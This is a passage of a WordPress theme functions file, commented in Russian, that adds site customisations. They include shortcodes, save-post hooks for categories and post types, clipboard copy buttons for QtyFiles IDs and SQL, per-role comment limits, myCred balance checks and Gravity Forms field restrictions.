wEEyCYRh6iSAg2TMWxcu0pB7SGngIBkF0vxQjYlD8oWDZK7aZl2kQXFIaeAgmQXS5HCNigOBFKpWnq4XAn9gWBzkADQuWRFo2D1klqxBVrnOudvEWqRxcUg94CA5VdHSWB2IQ9KFgxQs2mpdpBNxSGngIAUFwtD2CeAghXNUnYt05B5SGjhIYYFUNXxn4pDc4CAGKrQKF+lQHFIaOIgBgZgPoVNxSF5wECPVadZFOhaHlAYOYkQghGGTAA5iKC/mXKRz95DSwEEMCcRUKIhjTgcOYqoqh8GEiyCOpSpwkAUFOzMBxHFVCAjkCoeND/y9iI08SBQIxE4uykeCe3zKAWuQT0hsHMi+FkEcm4nHQTaxdHYQcewmHAfZRVP+RBYXQRx3E42D3MXDyd4J4CDGKyCpi+AeD7OPgzxE1GgDxOGUWBzECVPZRtFdBHE4JxQHcUbVSEPE4ZVIBOKFq1xjnq6XYY9AynAvMyru4c2dNYg3snIXBK1FEMehxOEgh7BVdhHiOJwwHOQwujIXersI4ghKFA4ShI+LWyeAg1SYYWcXwT2Cs4uDBCM02gHiiJIYHCQKxvyd3HURxBEtIThINJRGOkIcRhJBGCYIPL+8vj3/9fp7fk/7JoJqKAgcpKFkMhUIQGCDwOwiuMcGGQ5BAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACEIAABCAAAQhAAAIQgAAEIAABCEAAAhCAAAQgAAEIQAACELBG4H+UlDStZHGzOQAAAABJRU5ErkJggg==" alt="Will insert">';
}
add_shortcode('playlist', 'pl_short');




//  отключает алмаз и Daz-Poser при сохранении поста
function my_remove_taxonomies_on_save($post_id) {
    // Проверяем, является ли это автосохранением
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }
    // Проверяем, является ли это ревизией
    if (wp_is_post_revision($post_id)) {
        return;
    }
    // Проверяем тип записи, если нужно
    if (get_post_type($post_id) !== 'post') { // Если работаете с кастомным типом, замените 'post' на нужный
        return;
    }
    // Получаем содержимое записи
    $post_content = get_post_field('post_content', $post_id);
    // Проверяем наличие строки [mycred_sell_this]
    if (strpos($post_content, '[mycred_sell_this]') === false) {
        // Удаление категории DAZ | Poser (ID 6)
        $category_to_remove = 6; // ID категории
        $categories = wp_get_post_categories($post_id);
        // Исключаем категорию с ID 6 из списка
        if (($key = array_search($category_to_remove, $categories)) !== false) {
            unset($categories[$key]);
        }
        // Применяем обновлённый список категорий
        wp_set_post_categories($post_id, $categories);
        // Удаление тега ◈ (ID 860)
        $tag_to_remove = 860; // ID тега
        $tags = wp_get_post_terms($post_id, 'post_tag', ['fields' => 'ids']);
        // Исключаем тег с ID 860 из списка
        if (($key = array_search($tag_to_remove, $tags)) !== false) {
            unset($tags[$key]);
        }

        // Применяем обновлённый список тегов
        wp_set_post_terms($post_id, $tags, 'post_tag');

        // Лог для отладки (можно удалить после тестирования)
        error_log("Категория DAZ | Poser и тег ◈ удалены для записи ID {$post_id}");
    }
}
add_action('save_post', 'my_remove_taxonomies_on_save');


// Отключение коротких ссылок WordPress
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
remove_action('template_redirect', 'wp_shortlink_header', 11, 0);

// Добавляем поддержку шорткодов в заголовках и ссылках меню
add_filter('wp_nav_menu_objects', 'process_shortcodes_in_menu_items', 10, 2);
function process_shortcodes_in_menu_items($items, $args) {
    foreach ($items as &$item) {
        // Обрабатываем шорткоды в заголовке пункта меню
        if (strpos($item->title, '[') !== false) {
            $item->title = do_shortcode($item->title);
        }

        // Обрабатываем шорткоды в ссылке (URL) пункта меню
        if (strpos($item->url, '[') !== false) {
            $item->url = do_shortcode($item->url);
        }
    }
    return $items;
}

// копировать QtyFiles link
function add_custom_copy_script() {
    ?>
    <style>
        #copy-id-button, #copy-sql-button {
            color: white;
            border: none;
            padding: 5px 14px;
            font-size: 17px;
            border-radius: 0 3px 5px 2px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.1s ease;
        }
        #copy-id-button {
            background-color: #ff8046;
        }
        #copy-sql-button {
            background-color: #7b52ab;
        }
        #copy-id-button:hover { background-color: #3399ff; }
        #copy-sql-button:hover { background-color: #3399ff; }
        #copy-id-button:active, #copy-sql-button:active { transform: scale(0.95); }
        #copy-id-button.copied, #copy-sql-button.copied { background-color: #82b440; }
		
		
		
		#copy-sql-button {
    background-color: #7b52ab;
    position: relative;
}
#sql-icon {
    cursor: pointer;
    font-size: 13px;
    padding: 0 4px;
    opacity: 0.8;
    border-left: 1px solid rgba(255,255,255,0.3);
    margin-left: 4px;
}
#sql-icon:hover { opacity: 1; }

#ssh-cheatsheet {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #1e1e2e;
    border: 1px solid #7b52ab;
    border-radius: 8px;
    padding: 20px;
    z-index: 99999;
    min-width: 420px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    font-family: monospace;
}
#ssh-cheatsheet h4 {
    color: #cdd6f4;
    margin: 0 0 14px 0;
    font-size: 14px;
    font-family: sans-serif;
    border-bottom: 1px solid #444;
    padding-bottom: 8px;
}
.cheat-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    background: #2a2a3e;
    border-radius: 5px;
    padding: 8px 12px;
    margin-bottom: 8px;
    gap: 10px;
}
.cheat-row code {
    color: #a6e3a1;
    font-size: 13px;
    flex: 1;
    word-break: break-all;
}
.cheat-copy {
    background: #7b52ab;
    color: white;
    border: none;
    border-radius: 4px;
    padding: 3px 10px;
    font-size: 12px;
    cursor: pointer;
    white-space: nowrap;
    transition: background 0.2s;
}
.cheat-copy:hover { background: #3399ff; }
.cheat-copy.copied { background: #82b440; }
#ssh-cheatsheet-close {
    position: absolute;
    top: 10px;
    right: 14px;
    background: none;
    border: none;
    color: #888;
    font-size: 18px;
    cursor: pointer;
}
#ssh-cheatsheet-close:hover { color: #fff; }
#ssh-cheatsheet-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.4);
    z-index: 99998;
}
    </style>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const copyButton    = document.getElementById('copy-id-button');
        const copySqlButton = document.getElementById('copy-sql-button');
		
		
		// Иконка в кнопке Copy SQL
if (copySqlButton) {
    const icon = document.createElement('span');
    icon.id = 'sql-icon';
    icon.textContent = '⚙';
    copySqlButton.appendChild(icon);

    icon.addEventListener('click', function(e) {
        e.stopPropagation();
        document.getElementById('ssh-cheatsheet').style.display = 'block';
        document.getElementById('ssh-cheatsheet-overlay').style.display = 'block';
    });
}

// Закрытие окошка
const sshCheatsheetClose = document.getElementById('ssh-cheatsheet-close');
if (sshCheatsheetClose) {
    sshCheatsheetClose.addEventListener('click', function() {
        const cheatsheet = document.getElementById('ssh-cheatsheet');
        if (cheatsheet) cheatsheet.style.display = 'none';
        const overlay = document.getElementById('ssh-cheatsheet-overlay');
        if (overlay) overlay.style.display = 'none';
    });
}

const sshCheatsheetOverlay = document.getElementById('ssh-cheatsheet-overlay');
if (sshCheatsheetOverlay) {
    sshCheatsheetOverlay.addEventListener('click', function() {
        const cheatsheet = document.getElementById('ssh-cheatsheet');
        if (cheatsheet) cheatsheet.style.display = 'none';
        this.style.display = 'none';
    });
}

// Кнопки Copy внутри шпаргалки
document.querySelectorAll('.cheat-copy').forEach(function(btn) {
    btn.addEventListener('click', function() {
        navigator.clipboard.writeText(this.dataset.text).then(() => {
            const orig = this.textContent;
            this.textContent = '✓';
            this.classList.add('copied');
            setTimeout(() => {
                this.textContent = orig;
                this.classList.remove('copied');
            }, 1500);
        });
    });
});

        // Вспомогательная функция: достать ID из ссылки QtyFiles
        function getQtyId() {
            const postContent = document.querySelector('.blog-content, .post-content, .content-area');
            if (!postContent) {
                console.error('Контейнер с контентом не найден');
                return null;
            }
            const link = postContent.querySelector('a[href^="https://qtyfiles.com/"]');
            if (!link) {
                console.warn('Ссылка QtyFiles не найдена');
                return null;
            }
            const match = link.href.match(/^https:\/\/qtyfiles\.com\/([^\/?#]+)/);
            if (!match) {
                console.error('Некорректная структура URL:', link.href);
                return null;
            }
            return match[1];
        }

        // Вспомогательная функция: копировать текст + анимация кнопки
        function copyText(text, btn, label) {
            navigator.clipboard.writeText(text)
                .then(() => {
                    console.log(label + ' скопирован:', text);
                    btn.textContent = 'Готово!';
                    btn.classList.add('copied');
                    setTimeout(() => {
                        btn.textContent = label;
                        btn.classList.remove('copied');
                    }, 2000);
                })
                .catch(err => console.error('Ошибка копирования:', err));
        }

        // Кнопка Copy ID
        if (copyButton) {
            copyButton.addEventListener('click', function() {
                try {
                    const id = getQtyId();
                    if (!id) return;
                    copyText(id, copyButton, 'Copy ID');
                } catch (error) {
                    console.error('Ошибка в скрипте копирования:', error);
                }
            });
        }

        // Кнопка Copy SQL
        if (copySqlButton) {
            copySqlButton.addEventListener('click', function() {
                try {
                    const id = getQtyId();
                    if (!id) return;
                    const sql = `UPDATE Files SET usr_id = 2, file_trashed = '0000-00-00 00:00:00' WHERE file_code = '${id}';`;
                    copyText(sql, copySqlButton, 'Copy SQL');
                } catch (error) {
                    console.error('Ошибка в SQL-скрипте:', error);
                }
            });
        }
    });
    </script>
    <?php
}
add_action('wp_footer', 'add_custom_copy_script');



// кнопка Enter для отправки коммента
function custom_comment_submit_shortcut() {
    ?>
    <script type="text/javascript">
        document.addEventListener('keydown', function(event) {
            if ((event.ctrlKey || event.metaKey) && event.key === 'r') {
                const submitButton = document.querySelector('#submit');
                if (submitButton) {
                    submitButton.click();
                }
            }
        });
    </script>
    <?php
}
add_action('wp_footer', 'custom_comment_submit_shortcut');







/**
* меняет в миниатюре вторую картинку на первую при обновлении поста
* https://chat.deepseek.com/a/chat/s/05d836a3-0b30-4294-a72c-f5b89f4c80a3
function update_featured_image_on_save($post_id) {
    // Проверяем, что это не автосохранение или ревизия
    if (wp_is_post_autosave($post_id) || wp_is_post_revision($post_id)) {
        return;
    }

    // Проверяем, если пост не в корзине
    if ('trash' === get_post_status($post_id)) {
        return;
    }

    // Получаем содержимое поста
    $post = get_post($post_id);
    if (!$post) {
        return;
    }

    // Ищем первое изображение в контенте
    preg_match_all('/<img.*?src=["\'](.*?)["\']/', $post->post_content, $matches);
    if (empty($matches[1])) {
        return; // Нет изображений в контенте
    }

    // Берём первое изображение
    $image_url = esc_url_raw($matches[1][0]);

    // Получаем текущую миниатюру поста
    $current_thumbnail_id = get_post_thumbnail_id($post_id);
    $current_thumbnail_url = $current_thumbnail_id ? wp_get_attachment_url($current_thumbnail_id) : '';

    // Если миниатюра уже правильная, выходим
    if ($current_thumbnail_url === $image_url) {
        return;
    }

    // Проверяем, загружено ли изображение в медиатеку
    $attachment_id = attachment_url_to_postid($image_url);

    if ($attachment_id) {
        // Если изображение уже в медиатеке, устанавливаем его как миниатюру
        set_post_thumbnail($post_id, $attachment_id);
        return;
    }

    // Если изображение внешнее, загружаем его в медиатеку
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    require_once ABSPATH . 'wp-admin/includes/image.php';

    // Загружаем изображение во временный файл
    $tmp = download_url($image_url);
    if (is_wp_error($tmp)) {
        return;
    }

    $file_array = [
        'name'     => basename(parse_url($image_url, PHP_URL_PATH)), // Имя файла
        'tmp_name' => $tmp,
    ];

    // Загружаем файл в медиатеку
    $attachment_id = media_handle_sideload($file_array, $post_id);

    // Удаляем временный файл в случае ошибки
    if (is_wp_error($attachment_id)) {
        @unlink($tmp);
        return;
    }

    // Устанавливаем загруженное изображение как миниатюру записи
    set_post_thumbnail($post_id, $attachment_id);
}

// Хук на сохранение поста
add_action('save_post', 'update_featured_image_on_save');

// Для старых записей, запускаем функцию обновления миниатюр, когда обновляется пост
function update_featured_image_for_old_posts() {
    // Получаем все посты без миниатюр (не из корзины)
    $args = [
        'post_type'      => 'post',
        'posts_per_page' => -1, // Обрабатываем все записи
        'post_status'    => 'publish', // Только опубликованные записи
        'meta_query'     => [
            [
                'key'     => '_thumbnail_id',
                'compare' => 'NOT EXISTS', // Посты без миниатюр
            ]
        ]
    ];
    
    $old_posts = get_posts($args);
    
    foreach ($old_posts as $post) {
        // Обновляем миниатюру для каждого поста
        update_featured_image_on_save($post->ID);
    }
}

// Запускаем обновление миниатюр для старых постов при активации темы или при обновлении
add_action('after_switch_theme', 'update_featured_image_for_old_posts');
add_action('save_post', 'update_featured_image_for_old_posts');

*/


// https://chat.deepseek.com/a/chat/s/616876c6-b483-4db0-bc04-25600f32e9ab
function change_post_type_on_save($post_id, $post, $update) {
    // Проверяем, что это не автосохранение и что пост существует
    if (wp_is_post_autosave($post_id) || wp_is_post_revision($post_id)) {
        return;
    }

    // Проверяем, что тип поста "Request"
    if ($post->post_type === 'request') {
        // Проверяем, что автор поста не является администратором
        $author_id = $post->post_author;
        if (!user_can($author_id, 'administrator')) {
            // Меняем тип поста на "Post"
            $post_data = array(
                'ID' => $post_id,
                'post_type' => 'post',
            );

            // Обновляем пост
            wp_update_post($post_data);
        }
    }
}
add_action('save_post', 'change_post_type_on_save', 10, 3);

//
function remove_price_custom_field_on_save($post_id, $post, $update) {
    // Проверяем, что это не автосохранение и что пост существует
    if (wp_is_post_autosave($post_id) || wp_is_post_revision($post_id)) {
        return;
    }
    // Проверяем, что тип поста НЕ "request"
    if ($post->post_type !== 'request') {
        // Удаляем метаполе "price"
        delete_post_meta($post_id, 'price');
    }
}
add_action('save_post', 'remove_price_custom_field_on_save', 10, 3);

// фильтры для пагинация в постах
function update_pagination_ajax() {
    $pagination_type = $_POST['pagination_type'];
    $post_id = $_POST['post_id'];

    // Получаем предыдущий и следующий пост
    if ($pagination_type === 'author') {
        $current_author_id = get_post_field('post_author', $post_id);
        $args = array(
            'post_type'      => 'post',
            'author'         => $current_author_id,
            'posts_per_page' => -1,
            'orderby'        => 'date',
            'order'          => 'DESC'
        );
        $author_posts = get_posts($args);
        $current_index = array_search($post_id, array_column($author_posts, 'ID'));
        $prev_post = ($current_index > 0) ? $author_posts[$current_index - 1] : null;
        $next_post = ($current_index < count($author_posts) - 1) ? $author_posts[$current_index + 1] : null;
    } else {
        $in_same_term = ($pagination_type === 'category');
        $prev_post = get_previous_post($in_same_term, '', 'category', $post_id);
        $next_post = get_next_post($in_same_term, '', 'category', $post_id);
    }
    // Генерируем HTML для пагинации
    ob_start();
    ?>
    <div class="blog-next-page center animate-me fadeInUp" role="navigation">
        <?php if ($prev_post) : ?>
            <a class="btn btn-default" href="<?php echo get_permalink($prev_post->ID); ?>">
                <i class="fa fa-hand-point-left"></i> <?php echo $prev_post->post_title; ?>
            </a>
        <?php endif; ?>
        <?php if ($next_post) : ?>
            <a class="btn btn-default" href="<?php echo get_permalink($next_post->ID); ?>">
                <?php echo $next_post->post_title; ?> <i class="fa fa-hand-point-right"></i>
            </a>
        <?php endif; ?>
    </div>
    <?php
    $html = ob_get_clean();

    // Возвращаем HTML
    echo $html;
    wp_die();
}
add_action('wp_ajax_update_pagination', 'update_pagination_ajax');
add_action('wp_ajax_nopriv_update_pagination', 'update_pagination_ajax');

// Подключаем tooltip.js и tooltip.css
function custom_tooltip_assets() {
    wp_enqueue_script(
        'custom-tooltip-js',
        get_stylesheet_directory_uri() . '/js/tooltip.js',
        array(), null, true
    );

    wp_enqueue_style(
        'custom-tooltip-css',
        get_stylesheet_directory_uri() . '/css/tooltip.css'
    );
}
add_action('wp_enqueue_scripts', 'custom_tooltip_assets');


/**
 * Добавляет индикатор ID записи в админ-бар с возможностью копирования
 */

// Добавляем пункт в админ-бар
add_action('admin_bar_menu', 'add_post_id_to_admin_bar', 999);

function add_post_id_to_admin_bar($wp_admin_bar) {
    // Проверяем, что мы на странице записи/страницы
    if (!is_singular() && !is_admin()) {
        return;
    }
    
    global $post;
    $post_id = null;
    
    // Получаем ID записи в зависимости от контекста
    if (is_admin() && isset($_GET['post'])) {
        $post_id = intval($_GET['post']);
    } elseif (is_admin() && isset($_POST['post_ID'])) {
        $post_id = intval($_POST['post_ID']);
    } elseif (isset($post) && $post->ID) {
        $post_id = $post->ID;
    }
    
    if (!$post_id) {
        return;
    }
    
    // Добавляем пункт в админ-бар
    $wp_admin_bar->add_node(array(
        'id'    => 'post-id-indicator',
        'title' => '<span id="post-id-copy" style="cursor: pointer; padding: 8px; background: #009ee9; color: white; border-radius: 3px;" >ID: ' . $post_id . '</span>',
        'href'  => false,
    ));
}

// Добавляем JavaScript для копирования в буфер
add_action('wp_footer', 'add_copy_post_id_script');
add_action('admin_footer', 'add_copy_post_id_script');

function add_copy_post_id_script() {
    if (!is_user_logged_in()) {
        return;
    }
    
    global $post;
    $post_id = null;
    
    if (is_admin() && isset($_GET['post'])) {
        $post_id = intval($_GET['post']);
    } elseif (is_admin() && isset($_POST['post_ID'])) {
        $post_id = intval($_POST['post_ID']);
    } elseif (isset($post) && $post->ID) {
        $post_id = $post->ID;
    }
    
    if (!$post_id) {
        return;
    }
    ?>
    <script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        const postIdElement = document.getElementById('post-id-copy');
        if (postIdElement) {
            postIdElement.addEventListener('click', function() {
                const postId = '<?php echo $post_id; ?>';
                
                // Современный способ копирования
                if (navigator.clipboard && window.isSecureContext) {
                    navigator.clipboard.writeText(postId).then(function() {
                        showCopyNotification('success');
                    }).catch(function() {
                        fallbackCopy(postId);
                    });
                } else {
                    fallbackCopy(postId);
                }
            });
        }
        
        function fallbackCopy(text) {
            const textArea = document.createElement('textarea');
            textArea.value = text;
            textArea.style.position = 'fixed';
            textArea.style.opacity = '0';
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            
            try {
                document.execCommand('copy');
                showCopyNotification('success');
            } catch (err) {
                showCopyNotification('error');
            }
            
            document.body.removeChild(textArea);
        }
        
        function showCopyNotification(type) {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 50px;
                right: 200px;
                padding: 10px 15px;
                border-radius: 4px;
                color: white;
                font-weight: bold;
                z-index: 999999;
                transition: opacity 0.3s ease;
                ${type === 'success' ? 'background: #ff9800;' : 'background: #dc3232;'}
            `;
            notification.textContent = type === 'success' ? 
                'ID скопирован в буфер!' : 
                'Ошибка копирования';
            
            document.body.appendChild(notification);
            
            setTimeout(function() {
                notification.style.opacity = '0';
                setTimeout(function() {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 3000);
            }, 20000);
        }
    });
    </script>
    
    <style>
    #post-id-copy:hover {
        background: #8bc34a !important;
        transform: scale(1.02);
        transition: all 0.2s ease;
    }
    
    #post-id-copy:active {
        transform: scale(0.98);
    }
    </style>
    <?php
}

// шорткод комментариев
function custom_comment_section() {
    ob_start(); 
    if ( comment_open() || get_comments_number() ) {
        comment_template();
    }
    return ob_get_clean(); 
}
add_shortcode('comment_widget', 'custom_comment_section');

function add_balance_check_script() {
      $user = wp_get_current_user();
        $balance = mycred_get_users_balance($user->ID, 'mycred_default');

    // Проверяем, меньше ли баланс 5 баллов
    if ($balance < 5) {
        // Добавляем скрипт для отключения кнопки отправки комментария
        wp_add_inline_script('comment-reply', '
            document.addEventListener("DOMContentLoaded", function() {
                var submitButton = document.querySelector(".comment-submit-btn");
                if (submitButton) {
                    submitButton.disabled = true;
                    submitButton.innerHTML = "<i class=\'woffice-icon woffice-icon-celst-send\'></i>";
                    submitButton.style.opacity = "0.5";
                    submitButton.style.cursor = "not-allowed";
                }
            });
        ');
    }
}
add_action('wp_enqueue_scripts', 'add_balance_check_script');

function remove_comment_fields($fields) {
    // Удаляем поле "Комментарий" comment-form-author
    unset($fields['author']);
    unset($fields['comment']);
    // Удаляем поле "Email"
    unset($fields['email']);
    // Удаляем поле "Сайт"
    unset($fields['url']);
    return $fields;
}
add_filter('comment_form_default_fields', 'remove_comment_fields');

//
function disable_comments_on_request_post_type() {
    if (get_post_type() === 'request') {
        // Отключаем поддержку комментариев
        remove_post_type_support('request', 'comments');
        // Скрываем существующие комментарии
        add_filter('comments_open', '__return_false', 10, 2);
        add_filter('pings_open', '__return_false', 10, 2);
        // Скрываем метабокс с комментариями в админке
        remove_meta_box('commentsdiv', 'request', 'normal');
    }
}
add_action('wp', 'disable_comments_on_request_post_type');


/**
 * Ограничение комментариев в день для разных ролей (только для зарегистрированных пользователей).
 */
add_filter('preprocess_comment', 'limit_comments_per_day_by_role');
function limit_comments_per_day_by_role($comment_data) {
    // Лимиты для разных ролей
    $limits = array(
        'administrator' => -1,  // -1 = без ограничений
        'editor'        => 50,  // 50 комментариев в день
        'eminent'        => 50,   // 50 комментариев в день
        'contributor'   => 40,   // 40 комментария в день
        'subscriber'    => 30,   // 30 комментария в день
        'contributory'    => 20,   // 20 комментария в день (beginner)
        'provisional'    => 10,   // 10 комментария в день
    );

    // Проверяем, зарегистрирован ли пользователь
    if (!is_user_logged_in()) {
        return $comment_data; // Если пользователь не зарегистрирован, пропускаем проверку
    }

    // Определяем роль пользователя
    $user = wp_get_current_user();
    $roles = $user->roles; // Получаем роли пользователя
    $role = $roles[0];     // Используем первую роль (основную)

    // Если роль не найдена в массиве, используем лимит по умолчанию (например, для подписчика)
    if (!isset($limits[$role])) {
        $role = 'inactive';
    }

    // Если лимит -1 (без ограничений), пропускаем проверку
    if ($limits[$role] === -1) {
        return $comment_data;
    }

    // Для зарегистрированных пользователей используем ID
    $user_id = get_current_user_id();
    $args = array(
        'date_query' => array(
            array(
                'after' => '24 hours ago',
            ),
        ),
        'count' => true,
        'user_id' => $user_id, // Поиск по ID пользователя
    );

    // Подсчет комментариев за последние 24 часа
    $comments_query = new WP_Comment_Query;
    $comments_count = $comments_query->query($args);

    // Если лимит превышен, показываем ошибку
    if ($comments_count >= $limits[$role]) {
        wp_die('You have exceeded your request limit for today (maximum ' . $limits[$role] . ').');
    }

    return $comment_data;
}


/**
 * Серверная проверка баланса пользователя перед публикацией комментария.
 * Это предотвращает обход ограничения через отключение JavaScript.
 */
add_filter('preprocess_comment', 'check_balance_before_commenting');

function check_balance_before_commenting($comment_data) {
    // Проверяем, что пользователь авторизован. Если нет, пропускаем проверку.
    if (!is_user_logged_in()) {
        return $comment_data;
    }

    // Проверяем, существует ли функция mycred_get_users_balance, чтобы избежать фатальной ошибки
    if (!function_exists('mycred_get_users_balance')) {
        // Можно вернуть ошибку или просто пропустить, если myCred не активен
        // wp_die('Плагин myCred не активен.');
        return $comment_data;
    }

    // Получаем ID текущего пользователя
    $user_id = get_current_user_id();

    // Получаем баланс пользователя для типа баллов 'mycred_default'
    $balance = mycred_get_users_balance($user_id, 'mycred_default');
    
    // Минимально необходимый баланс
    $required_balance = 5;

    // Если баланс меньше необходимого, прерываем выполнение и выводим ошибку
    if ($balance < $required_balance) {
        // wp_die() остановит процесс и покажет пользователю сообщение об ошибке
        wp_die(
            'У вас недостаточно средств на балансе для отправки комментария. Требуется минимум ' . $required_balance . ' баллов.', 
            'Ошибка: Недостаточно баллов', 
            ['response' => 403, 'back_link' => true]
        );
    }

    // Если все в порядке, возвращаем данные комментария для дальнейшей обработки
    return $comment_data;
}



// удаление кнопок из редактора постов
add_filter( 'gform_display_add_form_button', '__return_false' );
// Удаляем кнопку Video (ARVE) из классического редактора WordPress
function arve_remove_editor_button_ultimate() {
    // Проверяем, что мы на нужной странице редактирования
    // Совет: если у вас есть свои типы записей, добавьте их в массив, например: array('post', 'page', 'portfolio')
    $screen = get_current_screen();
    if ( ! $screen || ! in_array( $screen->base, array( 'post', 'page' ) ) ) {
        return;
    }

    // 1. Внедряем минималистичный, но эффективный CSS для мгновенного скрытия
    echo '<style id="arve-hide-button">
        .wp-media-buttons button.arve-btn {
            display: none !important;
        }
    </style>';

    // 2. Внедряем оптимизированный JS для полного удаления элемента из DOM
    ?>
    <script id="arve-remove-button-js">
    document.addEventListener('DOMContentLoaded', function() {
        'use strict';
        
        function removeArveButton() {
            try {
                // Один точный селектор убирает кнопку
                var arveButton = document.querySelector('.wp-media-buttons button.arve-btn');
                if (arveButton && arveButton.parentNode) {
                    arveButton.parentNode.removeChild(arveButton);
                }
            } catch (e) {
                // На случай ошибок, если что-то пойдет не так
                console.warn('ARVE button removal script failed:', e);
            }
        }

        // Выполняем один раз после загрузки DOM
        removeArveButton();
        
        // И для подстраховки через короткое время, если кнопка добавляется динамически
        setTimeout(removeArveButton, 100);

        // Безопасный наблюдатель за изменениями
        if (window.MutationObserver) {
            var targetNode = document.getElementById('wp-content-media-buttons'); // Более точная цель
            if (targetNode) {
                var observer = new MutationObserver(function(mutations) {
                    // При любой мутации снова пытаемся удалить кнопку
                    removeArveButton(); 
                });
                observer.observe(targetNode, { childList: true });
            }
        }
    });
    </script>
    <?php
}
// Используем ОДИН правильный хук с нормальным приоритетом
add_action('admin_head', 'arve_remove_editor_button_ultimate', 20);



/**
 * Блокировка полей Gravity Forms (ID 43) для гостей и ролей contributory, provisional.
 * Версия 8.0: CSS + JS "двойной замок"
 */
add_action('wp_footer', 'fgs_final_observer_disable_fields', 100);
function fgs_final_observer_disable_fields() {
    // 1. ПРОВЕРКА ПОЛЬЗОВАТЕЛЯ
    $is_restricted = false;
    
    if (!is_user_logged_in()) {
        $is_restricted = true; // Гость
    } else {
        $user = wp_get_current_user();
        $user_roles = (array) $user->roles;
        // Проверяем наличие ролей
        if (in_array('contributory', $user_roles) || in_array('provisional', $user_roles)) {
            $is_restricted = true;
        }
    }

    // Если пользователь — админ или имеет другие роли, ничего не делаем
    if (!$is_restricted) {
        return;
    }

    $form_id = 43; // ID вашей формы

    // 2. CSS БЛОКИРОВКА (сработает мгновенно)
    echo '<style>
        #field_'.$form_id.'_12, #field_'.$form_id.'_18, #field_'.$form_id.'_24 {
            opacity: 0.5 !important;
            
            cursor: not-allowed !important;
            position: relative;
        }
        #field_'.$form_id.'_12:after, #field_'.$form_id.'_18:after, #field_'.$form_id.'_24:after {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 999;
        }
    </style>';

    // 3. JS БЛОКИРОВКА (отключает инпуты физически)
    echo <<<JS
<script>
(function($) {
    function applyBlocking() {
        const formId = {$form_id};
        const fields = ['12', '18', '24'];
        
        fields.forEach(function(id) {
            const selector = '#field_' + formId + '_' + id;
            const \$field = $(selector);
            
            if (\$field.length > 0) {
                // Отключаем все элементы ввода
                \$field.find('input, textarea, select, button').prop('disabled', true);
                
                // Специально для загрузчика (поле 12), если он динамический
                if (id === '12') {
                    \$field.find('.gpfup__select-files, input[type="file"]').prop('disabled', true);
                }
            }
        });
    }

    // Запуск при загрузке страницы
    $(document).ready(applyBlocking);
    // Запуск после рендеринга Gravity Forms (для AJAX-форм)
    $(document).on('gform_post_render', function(event, loaded_form_id) {
        if (loaded_form_id == {$form_id}) {
            applyBlocking();
        }
    });

    // Наблюдатель на случай динамической подгрузки элементов внутри полей (MutationObserver)
    const observer = new MutationObserver(function(mutations) {
        applyBlocking();
    });

    const target = document.querySelector('#gform_wrapper_{$form_id}');
    if (target) {
        observer.observe(target, { childList: true, subtree: true });
    }
})(jQuery);
</script>
JS;
}



/**
 * СЕРВЕРНАЯ ВАЛИДАЦИЯ Gravity Forms (ID 43)
 * Если пользователь с ограниченной ролью умудрился отправить форму,
 * сервер её отклонит и выведет ошибку.
 */
add_filter( 'gform_validation_43', 'fgs_secure_server_validation' );
function fgs_secure_server_validation( $result ) {
    $form = $result['form'];
    
    // 1. Проверяем, ограничен ли пользователь
    $is_restricted = false;
    if ( ! is_user_logged_in() ) {
        $is_restricted = true;
    } else {
        $user = wp_get_current_user();
        $user_roles = (array) $user->roles;
        if ( in_array( 'contributory', $user_roles ) || in_array( 'provisional', $user_roles ) ) {
            $is_restricted = true;
        }
    }

    // 2. Если пользователь ограничен, помечаем все поля как невалидные
    if ( $is_restricted ) {
        $result['is_valid'] = false;

        foreach ( $form['fields'] as &$field ) {
            // Блокируем конкретно поля 12, 18 и 24
            if ( in_array( $field->id, [12, 18, 24] ) ) {
                $field->failed_validation = true;
                $field->validation_message = 'Access denied. Your current role does not allow using this field.';
            }
        }
    }

    $result['form'] = $form;
    return $result;
}

// !!! отображает награды в запросах https://chat.deepseek.com/a/chat/s/fa8197bd-bfbb-43d0-9392-1adbfbb8cacd
function create_request_block_from_custom_fields($atts) {
    $post_id = is_singular() ? get_the_ID() : 0;
    if (!$post_id) return '';

    $price_value = get_post_meta($post_id, 'price', true);
    $website_url = get_post_meta($post_id, 'website', true);

    ob_start();
    ?>
    <div class="reward-block-container">
        <div class="reward-text-center">
            Earn a <span class="pulse-diamond"><?php echo esc_html($price_value); ?></span> diamond reward by fulfilling the request
        </div>
        <?php if (!empty($website_url)) : ?>
            <a href="<?php echo esc_url($website_url); ?>" class="reward-btn" rel="nofollow noopener noreferrer" target="_blank">
                <i class="fas fa-shopping-cart"></i>  Buy Product
            </a>
        <?php endif; ?>
    </div>
    <?php
    return ob_get_clean();
}
add_shortcode('request_block', 'create_request_block_from_custom_fields');


/**
 * После отправки формы Gravity Forms, сохраняем ID записи в метаданные поста.
 * Это позволяет нам надежно найти запись позже, даже если пост станет черновиком.
 */
function link_gf_entry_to_post_on_submission( $entry, $form ) {
    // ID вашей формы
    $target_form_id = 43; 

    // ID вашего скрытого поля, в котором хранится ID поста
    // Возьмите его из вашего шорткода, параметр page_id_field_id (например, 6)
    $page_id_field_id = 28; // <-- УКАЖИТЕ ЗДЕСЬ ПРАВИЛЬНЫЙ ID ПОЛЯ

    // Проверяем, что это наша форма
    if ( $form['id'] != $target_form_id ) {
        return;
    }

    // Получаем ID поста из отправленных данных
    $post_id = isset( $entry[$page_id_field_id] ) ? $entry[$page_id_field_id] : null;

    if ( $post_id ) {
